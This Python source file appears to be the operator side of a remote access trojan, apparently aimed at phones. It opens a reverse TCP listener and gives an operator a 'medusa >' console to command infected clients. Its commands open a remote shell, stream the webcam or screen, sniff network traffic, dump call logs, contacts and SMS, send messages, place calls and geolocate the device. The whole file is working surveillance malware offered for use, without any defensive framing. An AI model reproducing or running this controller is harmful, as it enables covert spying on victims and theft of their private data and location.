import socket
import threading
import time
import logging
from flask import Flask, Response, request
from colorama import Fore, Style, init
import cv2
import numpy as np
import sys
import os
import keyboard

# Initialize colorama and logging
init(autoreset=True)
logging.basicConfig(level=logging.DEBUG, format='%(asctime)s - %(levelname)s - %(message)s')

app = Flask(__name__)
clients = {}
server_thread = None
streaming = False  # To track the streaming status
flask_thread = None

def start_streaming(client_socket, mode):
    global streaming, flask_thread
    streaming = True
    logging.info("Starting streaming...")

    @app.route('/')
    def video_feed():
        return Response(generate_frames(client_socket),
                        mimetype='multipart/x-mixed-replace; boundary=frame')

    @app.route('/shutdown', methods=['POST'])
    def shutdown():
        shutdown_server()
        return 'Server shutting down...'

    logging.info("Opening player at: http://localhost:5000")
    logging.info("Streaming...")

    # Run the Flask app in a separate thread to handle the streaming
    flask_thread = threading.Thread(target=lambda: app.run(host='0.0.0.0', port=5000, use_reloader=False))
    flask_thread.start()

    # Start a thread to listen for CTRL+X key combination
    threading.Thread(target=listen_for_ctrl_x).start()

def generate_frames(client_socket):
    while True:
        try:
            data = client_socket.recv(921600)
            if not data:
                break
            frame = cv2.imdecode(np.frombuffer(data, np.uint8), cv2.IMREAD_COLOR)
            ret, buffer = cv2.imencode('.jpg', frame)
            frame = buffer.tobytes()
            yield (b'--frame\r\n'
                   b'Content-Type: image/jpeg\r\n\r\n' + frame + b'\r\n')
        except Exception as e:
            logging.error(f"Error generating frames: {e}")
            break

def listen_for_ctrl_x():
    global streaming
    while streaming:
        if keyboard.is_pressed('ctrl+x'):
            logging.info("CTRL+X detected, stopping the Flask server and returning to prompt...")
            stop_flask_server()

def stop_flask_server():
    global streaming
    streaming = False
    try:
        # Send a shutdown request to the Flask server
        requests.post('http://localhost:5000/shutdown')
        logging.info("Flask server stopped.")
    except Exception as e:
        logging.error(f"Error stopping Flask server: {e}")

def shutdown_server():
    func = request.environ.get('werkzeug.server.shutdown')
    if func is None:
        raise RuntimeError('Not running with the Werkzeug Server')
    func()

def handle_client(client_socket, addr):
    target_ip, target_port = addr
    logging.info(f"Metercrack session 1 opened (0.0.0.0:9999 -> {target_ip}:{target_port})")

    while True:
        try:
            command = input(Fore.MAGENTA + "medusa > ")
        except EOFError:
            break

        logging.info(f"Command '{command}' sent to client.")
        client_socket.send(command.encode('utf-8'))

        if command == "sniffer_start":
            logging.info("Starting network sniffer on client...")
            
        if command == "shell":
            logging.info("Entering interactive shell mode. Type 'exit' to leave.")
            while True:
                shell_command = input(Fore.CYAN + "shell > ")
                if shell_command.lower() == "exit":
                    logging.info("Exiting shell mode.")
                    break
                client_socket.send(shell_command.encode('utf-8'))
                output = client_socket.recv(4096).decode('utf-8')
                print(Fore.WHITE + output)
            continue

        if command.startswith("webcam_stream") or command.startswith("screen_stream"):
            mode = command.split('_')[0]
            start_streaming(client_socket, mode)
            continue

        if command.startswith("dump_calllog"):
            client_socket.send(command.encode('utf-8'))
            output = client_socket.recv(4096).decode('utf-8')
            print(Fore.WHITE + output)
            continue

        if command.startswith("dump_contacts"):
            client_socket.send(command.encode('utf-8'))
            output = client_socket.recv(4096).decode('utf-8')
            print(Fore.WHITE + output)
            continue

        if command.startswith("dump_sms"):
            client_socket.send(command.encode('utf-8'))
            output = client_socket.recv(4096).decode('utf-8')
            print(Fore.WHITE + output)
            continue
        
        if command.startswith("send_sms"):
            client_socket.send(command.encode('utf-8'))
            output = client_socket.recv(4096).decode('utf-8')
            print(Fore.WHITE + output)
            continue

        if command.startswith("geolocate"):
            client_socket.send(command.encode('utf-8'))
            output = client_socket.recv(4096).decode('utf-8')
            print(Fore.WHITE + output)
            continue

        if command.startswith("call"):
            client_socket.send(command.encode('utf-8'))
            output = client_socket.recv(4096).decode('utf-8')
            print(Fore.WHITE + output)
            continue

        client_socket.send(command.encode('utf-8'))

def main():
    try:
        server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server_socket.bind(('0.0.0.0', 9999))
        server_socket.listen(5)
        logging.info("Started reverse TCP handler on 0.0.0.0:9999")
        logging.info("Listening for incoming connections...")

        while True:
            client_socket, addr = server_socket.accept()
            logging.info(f"Connection established from {addr}")
            client_handler = threading.Thread(target=handle_client, args=(client_socket, addr))
            client_handler.start()
    except Exception as e:
        logging.error(f"Error in main: {e}")

if __name__ == "__main__":
    main()
